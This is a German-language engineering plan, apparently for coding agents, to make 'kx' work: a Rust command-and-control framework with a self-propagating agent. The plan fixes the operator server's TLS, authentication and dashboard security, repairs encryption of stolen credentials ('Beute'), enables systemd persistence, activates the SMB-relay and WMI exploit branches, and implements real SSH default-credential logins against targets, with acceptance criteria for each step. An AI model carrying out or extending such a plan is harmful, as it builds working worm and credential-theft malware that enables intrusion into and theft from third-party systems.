- **Änderung**: `axum-server = { version = "0.7", features = ["tls-rustls"] }` wird zu
  `axum-server = { version = "0.7", features = ["tls-rustls-no-provider"] }`.
- **Warum**: `tls-rustls` aktiviert zusätzlich `rustls/aws-lc-rs`, was zusammen mit
  `rustls/ring` aus `kx-tls` und `ureq` den CryptoProvider mehrdeutig macht und den
  Start-Panic verursacht. `tls-rustls-no-provider` enthält dieselben
  TLS-Funktionen, aktiviert aber keinen zweiten Provider. `aws-lc-rs` verschwindet
  damit vollständig aus `Cargo.lock`.

**2. `kx/crates/kx-tls/src/lib.rs` — Provider explizit installieren**

- **Änderung**: Eine Funktion, die den CryptoProvider installiert und beim zweiten
  Aufruf den bereits installierten Provider zurückgibt statt zu panicen. Aufruf
  am Anfang von `generate_server_tls` und `client_config_trusting`.
- **Warum**: `kx-tls` ist der gemeinsame TLS-Einstiegspunkt von Server, Agent und
  CLI. Wer den Provider hier festlegt, bekommt überall dasselbe Verhalten. Die
  Fehlertoleranz beim zweiten Aufruf ist nötig, weil `install_default()` bei
  bereits gesetztem Provider einen Fehler liefert und beide Aufrufpfade in einem
  Prozess vorkommen können.

**3. `kx/crates/kx-server/src/auth.rs` — Middleware statt ungenutztem Extractor**

- **Änderung**: Der `Authenticated`-Extractor bleibt als Basis, wird aber von einer
  Middleware verwendet, die an der Router-Ebene hängt. Der Token-Vergleich wird
  constant-time. `verify()` wird von der Middleware genutzt statt vom Extractor
  unbenutzt gelassen.
- **Warum**: Der Extractor wird heute von keinem Handler verwendet, also schützt
  er nichts. Eine Middleware gilt für alle Routen des Routers automatisch; eine
  Route, die den Extractor vergisst, bleibt beim Extractor-Ansatz ungeschützt.
  Entscheidung D1, verworfene Wege in Alternative A und B.

**4. `kx/crates/kx-server/src/main.rs` — API-Subrouter absichern**

- **Änderung**: Ein API-Subrouter trägt die fünf Vertragspfade und bekommt die
  Middleware per `route_layer`. Der Dashboard-Router (`GET /`) bleibt getrennt,
  beide werden mit `merge` zusammengeführt. **Die Reihenfolge ist zwingend:**
  erst alle Routen, dann `route_layer` — eine danach hinzugefügte Route bliebe
  ungeschützt. Ein Kommentar an der Stelle gehört zur Änderung.
- **Warum**: Der Server behauptet in seinem Modul-Doc-Comment
  „Bearer-Token geschützt" — diese Behauptung stimmt erst ab hier. `route_layer`
  statt `layer`, damit ein 404 ein 404 bleibt und kein 401 (Alternative B).

**4a. `kx/crates/kx-server/src/dashboard.rs` — API-Werte escapen (ISSUE-13)**

- **Änderung**: Ein `escapeHtml()`-Helper kommt ins Dashboard-JavaScript und läuft
  über jeden Wert, bevor er in die `<td>`-Zeile interpoliert wird. Alternativ
  `textContent` statt `innerHTML`.
- **Warum**: Der Server legt `hostname`, `os`, `command`, `result`, `username`
  und `password` unverändert ab, und das Dashboard setzt sie per `innerHTML`.
  Ein im `hostname` enthaltenes `<img src=x onerror=…>` wird dadurch
  ausführbares Markup im Browser des Operators — verifiziert end-to-end.
- **Reihenfolge**: Dieser Punkt kommt **vor** Punkt 4b. Escaping ist
  Vorbedingung des HTML-Logins, nicht dessen Anhang.

**4b. `kx/crates/kx-server/src/dashboard.rs` und `kx/crates/kx-core/src/c2.rs` — HTML-Login (ISSUE-13)**

- **Änderung**: `kx_core::c2` bekommt den Pfadkonstanten `PATH_LOGIN`
  (`"/api/login"`). Der Server bekommt einen Handler `POST /api/login`, der das
  Token prüft und `200` oder `401` antwortet. Das Dashboard-HTML bekommt ein
  Login-Formular; das JavaScript hält das Token in einer Variable, blendet das
  Formular nach erfolgreicher Anmeldung aus und sendet es bei jedem `fetch` als
  `Authorization`-Header.
- **Änderung (Registrierung)**: `POST /api/login` wird **nicht** in den
  geschützten API-Subrouter aus Punkt 4 aufgenommen — er würde sich sonst selbst
  blockieren. Er wird daneben registriert und prüft das Token selbst.
- **Warum**: Das Token steht heute im Query-String (`dashboard.rs:27`) und damit
  in Browser-Historie, Server-Logs und geteilten Links. Für ein Werkzeug, das
  Beute-Credentials anzeigt, ist der Query-String der falsche Ort für ein
  Geheimnis. Kein Cookie, weil Cookies automatisch mitgesendet werden (CSRF),
  ein `Authorization`-Header nicht — Entscheidung D2.
- **Vertragsfolge**: `PATH_LOGIN` ist ein **Response**-Pfad und damit nach
  ADR-0001 strikt. Das Key-Set-Pinning in `c2.rs` und der Dashboard-Contract in
  `kx-server/src/README.md` müssen ihn aufnehmen. Der bestehende
  `dashboard_reads_only_fields_the_contract_defines`-Test in `dashboard.rs` parst
  das HTML auf `load('…')`-Zeilen und muss weiterhin greifen — das Login-Formular
  darf diese Struktur nicht brechen.

**5. `kx/crates/kx-agent/src/main.rs` — Persistenz mit vollständigem ExecStart**

- **Änderung**: `install_systemd_service` bekommt Server-URL und Token-Referenz
  statt des leeren Kommandos. Das Token wird nicht in die Unit-Datei geschrieben,
  sondern in eine separate `EnvironmentFile`, die per `Environment=` eingebunden
  wird.
- **Warum**: `ExecStart` ohne Argumente plus `Restart=always` ist eine
  Neustart-Schleife. Der Token gehört nicht in eine weltlesbare Unit-Datei.

**6. `kx/crates/kx-posix/src/persist.rs` — Unit-Datei und EnvironmentFile**

- **Änderung**: Die Unit-Datei bekommt `EnvironmentFile=` und die
  `Environment=`-Zeile für Server und Token. Eine zweite Datei wird mit `0600`
  geschrieben. Der Pfad zum EnvironmentFile ist konfigurierbar. Die
  unix-Variante von `install_systemd_service` (`#[cfg(unix)]`, Zeile 17) ist die
  zu ändernde; die Nicht-unix-Variante (Zeile 115) bleibt ein Fehler-Stub.
- **Warum**: `install_systemd_service` schreibt die Unit-Datei; ohne Änderung hier
  bleibt das leere `ExecStart` stehen.

**7. `kx/Cargo.toml` und `kx/crates/kx-core/Cargo.toml` — ml-kem-Pin zentralisieren**

- **Änderung**: In `kx/Cargo.toml` wird der Workspace-Pin von `=0.2.1` auf
  **`=0.2.3`** angehoben. In `kx/crates/kx-core/Cargo.toml` wird die
  eigenständige Deklaration `ml-kem = { version = "0.2.1", … }` durch
  `ml-kem = { workspace = true }` ersetzt.
- **Warum**: Der Caret-Bereich `^0.2.1` lässt 0.2.3 zu, und 0.2.3 wird aufgelöst —
  die Pin-Absicht des Workspaces wurde also nie wirksam. Über `workspace = true`
  gibt es nur noch eine Stelle, an der eine Version stehen kann; `kx-core` kann
  sie nicht mehr umgehen. Die Umgehung wird damit strukturell verhindert, nicht
  durch eine Prüfung (D3).
- **Warum gerade 0.2.3 und nicht 0.2.1**: `ml-kem` 0.2.1 verlangt `kem` mit dem
  Caret-Bereich `0.3.0-pre.0`, was `kem` 0.3.0 zulässt; das zieht `rand_core`
  0.10.1 neben die 0.6.4 des Workspaces und die Trait-Definitionen sind
  inkompatibel — der Build bricht. `ml-kem` 0.2.3 pinnt `kem` exakt auf
  `=0.3.0-pre.0` und bleibt bei einer einzigen `rand_core`-Version. Verifiziert
  in beiden Richtungen.

**8. `kx/crates/kx-core/src/hostkey.rs` — auf die ml-kem-0.2.x-API umschreiben**

- **Änderung**: Die Importe auf die Trait-API umstellen (`KemCore`, `Encapsulate`,
  `Decapsulate`, `EncodedSizeUser`), `MlRng` um `rand_core::CryptoRng` erweitern,
  die Schlüssel-Encoding- und -Decoding-Aufrufe auf `as_bytes()`/`from_bytes()`
  umstellen, `MLKEM_PUB_LEN`/`MLKEM_CT_LEN`/`MLKEM_SHARED_LEN` gegen die echten
  Größen prüfen (1184 / 1088 / 32 — die stimmen bereits). Den Import von
  `chacha20poly1305::aead::{Aead, KeyInit, Payload}` entfernen, weil die drei
  Traits unbenutzt sind.
- **Warum**: Der Modul-TODO nennt genau diese Anpassung. Der Prototyp gegen 0.2.x
  hat die Größen 1184 / 2400 / 1088 / 32 bestätigt — das Format bleibt unverändert.

**8a. `kx/crates/kx-core/src/hostkey.rs` — `derive_master_key_with_context` reparieren**

- **Änderung**: Das HKDF-Ergebnis in ein benanntes `let mut master_key =
  [0u8; MASTER_KEY_LEN]` schreiben und dieses an `hkdf_into` übergeben, statt es in
  ein Wegwerf-Array zu schreiben. Den `unsafe`-Block mit dem
  `copy_nonoverlapping(…, 0)` ersetzen — er kopiert null Bytes und ist damit
  entbehrlich.
- **Warum**: Der heutige Code schreibt das HKDF-Ergebnis in ein temporäres Array
  und verwirft es; das `copy_nonoverlapping` kopiert Länge `0`, also ist der
  zurückgegebene Master Key 32 Null-Bytes. Das ist heute harmlos, weil der Pfad
  nie läuft — aber sobald `hostkey` kompiliert ist, verschlüsselt die Beute mit
  einem Nullschlüssel. Der Bug muss vor der Aktivierung behoben werden, nicht
  danach.

**8b. `kx/crates/kx-core/src/hostkey.rs` — Seal/Unseal-Längen in X25519-only-Modus**

- **Änderung**: Die Längenprüfung in `unseal_master_key` wird modusabhängig: im
  Modus `KexId::X25519` werden 32 Byte (`X25519_PUB_LEN`) akzeptiert, im Modus
  `KexId::HybridX25519MlKem768` 1120 Byte (`SEALED_MASTER_LEN`). Der Empfänger
  liest den Modus aus `self.public.kex` — er muss ihn nicht raten und nicht aus
  der Länge ableiten. `SEALED_MASTER_LEN` bleibt 1120.
- **Warum**: `encapsulate_host_master_key` erzeugt im Modus `KexId::X25519` ein
  32 Byte langes `sealed_master`, `unseal_master_key` verlangt aber exakt 1120
  Byte. Der Roundtrip ist in diesem Modus so nicht schliessbar. Die
  X25519-only-Variante ist der dokumentierte Fallback, wenn ML-KEM nicht
  verfügbar ist — sie muss funktionieren. Entscheidung D6; das Auffüllen auf 1120
  ist in Alternative K verworfen.

**9. `kx/crates/kx-core/src/lib.rs` — hostkey aktivieren**

- **Änderung**: `// pub mod hostkey;` wird zu `pub mod hostkey;`.
- **Warum**: Der Kommentar ist der Grund, warum das Modul nicht Teil des Builds
  ist. Erst wenn es übersetzt ist, darf es hinein.

**10. `kx/crates/kx-core/src/c2.rs` — Master-Key-Transport**

- **Änderung**: `RegisterRequest` und `SecretUpload` bekommen je ein optionales
  Feld für den Master-Key-Schritt (`Option<String>`, base64 kodiert). Beide sind
  Request-Typen und damit per ADR-0001 lenient — ein älterer Server ignoriert
  die zusätzlichen Felder, statt sie zu ablehnen.
- **Warum**: `kx_core::c2` ist die einzige Definition des Wire-Vertrags; die
  Änderung gehört dorthin und nicht in einen der Crates. Entscheidung D5; der
  verworfene eigene Endpunkt steht in Alternative J (er hätte einen neuen
  **Antworttyp** erzeugt — und Antworttypen sind per ADR-0001 strikt).
- **Folge für die Contracts**: Die Key-Set-Pinning-Tests in `c2.rs` müssen um
  die neuen Felder erweitert werden, sonst brechen sie mit Absicht.

**11. Tests für Welle 1**

- **Änderung**: Tests, die den Provider-Konflikt fassen (ein Test, der
  `ServerConfig::builder()` aufruft und damit eine mehrdeutige Provider-Auflösung
  reproduzieren würde), ein Test für die Authentifizierung (401 ohne Token, 401 mit
  falschem Token, 200 mit korrektem Token) auf allen fünf Vertragspfaden, ein
  Roundtrip-Test für die hostkey-Kapselung in **beiden** KEX-Modi, ein Test, der
  `ml_kem::MlKem768` direkt benutzt (fällt bei einem Versionswechsel mit
  inkompatibler API durch den Compiler), und ein Test für den
  `ExecStart`-Inhalt der Unit-Datei.
- **Warum**: Der Start-Panic ist bisher durch keinen Test abgedeckt, weil er erst
  zur Laufzeit auftritt. Der Auth-Bypass ist durch keinen Test abgedeckt, weil es
  keinen Auth-Test gab. Beides sind genau die Lücken, die die Defekte haben
  entstehen lassen.

### Welle 2

**12. `kx/crates/kx-scanner/src/tcp_scan.rs` — Exploit-Ports**

- **Änderung**: Eine getrennte Konstante für Exploit-Ports (445, 5985, 5986)
  neben `COMMON_PORTS`.
- **Warum**: Der Exploit-Pfad braucht eigene Ports, die nicht in der allgemeinen
  Scan-Liste liegen. Sie in `COMMON_PORTS` aufzunehmen würde bei jedem Scan einen
  Exploit-Versuch auslösen.

**13. `kx/crates/kx-agent/src/propagate.rs` — Exploit-Zweige aktivieren**

- **Änderung**: Der Scan über die Exploit-Ports, die Fallunterscheidung für
  Port 445 (SMB-Relay) und der WMI-Pfad (5985/5986) greifen.
- **Warum**: Die Zweige existieren, werden aber nie betreten, weil die Ports nie
  gescannt werden.

**14. `kx/crates/kx-exploit/src/credential_stuff.rs` — echte Authentifizierung**

- **Änderung**: `try_default_credentials` führt für jedes Paar aus
  `DEFAULT_CREDENTIALS` einen echten SSH-Login gegen den Zielhost durch und
  liefert beim ersten Treffer ein `Auth` mit Benutzername, Passwort und
  `service = "ssh"`. Der Dienst bleibt SSH (Port 22) — nach D4.
- **Änderung (Manifest)**: `kx/crates/kx-exploit/Cargo.toml` bekommt
  `russh = { version = "0.54", default-features = false, features = ["ring"] }`.
  `default-features = false` ist zwingend, weil die Voreinstellung `aws-lc-rs`
  zieht — also genau das C-Backend, das ISSUE-1 entfernt.
- **Warum**: Der Pfad ist heute tot (`Ok(None)` ohne jeden Versuch). `russh` ist
  reines Rust, nutzt `rand_core` 0.6.4 wie der Workspace und kann Client und
  Server — Letzteres für den von ISSUE-3 geforderten Test gegen einen lokalen
  Mock-SSH-Dienst. `ssh2` wäre in Alternative G verworfen.

**15. `kx/crates/kx-win/src/secrets.rs` — JSON-Normalisierung**

- **Änderung**: `parse_secrets_from_json` akzeptiert sowohl ein Array als auch ein
  Einzelobjekt. Der Fehlerpfad `unwrap_or_default()` wird durch Logging ersetzt.
- **Warum**: `ConvertTo-Json` liefert bei genau einem Element ein Objekt. Der
  Parser erwartet ein Array und verwirft das Credential lautlos.

**16. `kx/crates/kx-server/src/db.rs` und `main.rs` — Task-Anlage und -Rückmeldung**

- **Änderung**: Ein Aufrufer von `Db::insert_task` — eine Route, die einen Task
  anlegt, und der Agent-Pfad, der offene Tasks abholt und das `result` zurückschreibt.
- **Warum**: `insert_task` hat keinen Aufrufer, `GET /api/tasks` liefert immer
  `[]`, und der `result`-Feldname ist der Punkt, an dem der ursprüngliche Bug
  lag.

**17. `kx/crates/kx-agent/src/main.rs` — Token aus dem Debug entfernen**

- **Änderung**: Die `Debug`-Ableitung von `Args` entfernen oder das Token-Feld
  durch einen Typ mit redigierendem `Debug` ersetzen.
- **Warum**: Das Token darf nicht in Debug-Ausgaben landen.

**18. `kx/crates/kx-exploit/examples/demo_worm.rs` — Kommentar korrigieren**

- **Änderung**: `--range 192.168.1.1 192.168.1.254` → `--start 192.168.1.1 --end
  192.168.1.254`.
- **Warum**: Die echten Flags sind `--start` und `--end`.

**19. Contract-Nachführung**

- **Änderung**: `kx/crates/kx-server/README.md` und
  `kx/crates/kx-server/src/README.md` (Auth-Middleware, HTML-Login, Escaping,
  Task-Fluss), `kx/crates/kx-agent/README.md` und `.../src/README.md` (Persistenz,
  Exploit-Pfade), `kx/crates/kx-core/README.md` und `.../src/README.md` (hostkey
  aktiv, ml-kem-Pin, `pub mod hostkey;` statt des TODO, neuer Pfad `PATH_LOGIN`),
  `kx/crates/kx-posix/README.md` und `.../src/README.md` (EnvironmentFile),
  `kx/crates/kx-win/README.md` und `.../src/README.md` (JSON-Normalisierung),
  `kx/crates/kx-scanner/README.md` und `.../src/README.md` (Exploit-Ports),
  `kx/crates/kx-exploit/README.md` und `.../src/README.md` (echte
  Credential-Tests), `kx/crates/kx-cli/README.md` und `.../src/README.md`
  (Task-Befehl).
- **Warum**: Die Contracts dokumentieren die Verhaltensweise des Codes. Wenn sich
  das Verhalten ändert, muss der Contract mitziehen — sonst beschreibt er den
  alten Zustand. Der `kx-core`-Contract nennt bisher `PATH_REGISTER`,
  `PATH_HEARTBEAT`, `PATH_SECRETS`, `PATH_HOSTS` und `PATH_TASKS`; mit
  `PATH_LOGIN` kommt ein sechster hinzu.

**20. Issue-Tracker nachführen**

- **Änderung**: Status der Issues auf `done` setzen, bei Bedarf
  `Technical Notes` ergänzen. ISSUE-12 (Auth-Bypass) und ISSUE-13 (Dashboard-XSS
  und Token im Query-String) sind bereits angelegt und im Epic eingetragen;
  ihre Akzeptanzkriterien werden mit dem jeweiligen Fix abgehakt.
- **Warum**: `docs/agents/issue-tracker.md` definiert den Status-Workflow. Die
  Issues sind die Aufgabenliste für die Umsetzung.

### Abnahmekriterien für die Umsetzung

Welle 1 ist fertig, wenn:

1. `cargo test --workspace` grün ist (47 Tests plus die neuen).
2. `cargo build --release` ohne Warnung zum CryptoProvider durchläuft.
3. `./target/release/kx-server --host 127.0.0.1 --port 8443 --db /tmp/kx.db --token test`
   läuft und loggt die API-Übersicht.
4. `GET /api/hosts` ohne Token → 401; mit falschem Token → 401; mit korrektem
   Token → 200. Dasselbe gilt für alle fünf Vertragspfade.
5. Ein unbekannter Pfad liefert **404**, nicht 401 — die Middleware läuft nur bei
   Treffern (`route_layer`, D1).
6. `GET /` liefert das Dashboard-HTML ohne Token. Das Dashboard zeigt ohne
   Anmeldung **keine** Daten; nach dem HTML-Login lädt es sie.
7. `POST /api/login` antwortet bei korrektem Token mit 200, bei falschem mit 401.
8. Ein Host mit HTML im `hostname` (`<img src=x onerror=…>`) erscheint im
   Dashboard als **Text**, nicht als ausführbares Markup.
9. Das Dashboard-HTML enthält keine Token-Quelle aus `location.search`; das
   Token erscheint weder in der URL noch in Browser-Historie oder Server-Log.
10. Der Agent startet durch die systemd-Unit und bleibt stabil.
11. `kx-core` löst genau `ml-kem` 0.2.3 auf — im Lockfile nachprüfbar — und das
    Lockfile enthält **genau eine** `rand_core`-Version (0.6.4) sowie **kein**
    `aws-lc-rs`.
12. `hostkey` ist kompiliert und der Kapselungs-Roundtrip besteht: 1120 Byte
    Chiffriertext im Hybrid-Modus, identischer Master Key auf beiden Seiten. Der
    Master Key ist **nicht** 32 Null-Bytes (der
    `derive_master_key_with_context`-Fehler ist behoben).
13. Der X25519-only-Modus ist schliessbar: `encapsulate_host_master_key` erzeugt
    32 Byte, `unseal_master_key` akzeptiert 32 Byte, und der Roundtrip ergibt
    denselben Master Key.
14. Der End-to-End-Durchlauf funktioniert: Agent → Register → Secret-Upload →
    Dashboard.

Welle 2 ist fertig, wenn:

15. Ein Ziel mit offenem 445 den SMB-Relay-Zweig auslöst.
16. Der Default-Credential-Pfad führt gegen Port 22 eine echte
    Authentifizierung durch — belegt durch einen Test gegen einen lokalen
    Mock-SSH-Dienst, der den Erfolgs- **und** den Misserfolgsfall abdeckt.
17. Ein Task angelegt wird, in `GET /api/tasks` erscheint und ausgeführt wird.
18. Das Token in keiner Debug-Ausgabe erscheint.
19. `cargo test --workspace` grün ist, mit Tests für jede der geänderten
    Verhaltensweisen.
